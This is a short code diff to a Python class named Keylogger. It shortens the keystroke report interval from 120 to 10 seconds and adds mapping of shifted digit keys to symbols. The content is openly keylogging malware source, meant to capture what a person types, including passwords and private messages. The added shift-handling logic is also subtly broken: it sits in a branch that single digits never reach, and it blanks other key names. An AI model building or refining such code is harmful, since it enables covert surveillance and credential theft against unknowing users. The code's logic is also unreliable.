@@ -3,7 +3,7 @@ import keyboard
 from threading import Timer
 from datetime import datetime
 
-REPORT_INTERVAL = 120
+REPORT_INTERVAL = 10
 
 
 class Keylogger:
@@ -18,6 +18,29 @@ class Keylogger:
     def keyLog(self, event):
         name = event.name
         if len(name) > 1:
+            if keyboard.is_pressed("shift"):
+                if name == '1':
+                    name = "!"
+                elif name == '2':
+                    name = '@'
+                elif name == '3':
+                    name = '#'
+                elif name == '4':
+                    name = '$'
+                elif name == '5':
+                    name = '%'
+                elif name == '6':
+                    name = '^'
+                elif name == '7':
+                    name = '&'
+                elif name == '8':
+                    name = '*'
+                elif name == '9':
+                    name = '('
+                elif name == '0':
+                    name = ')'
+                else:
+                    name = ""
             if name == "space":
                 name = " "
             elif name == "enter":
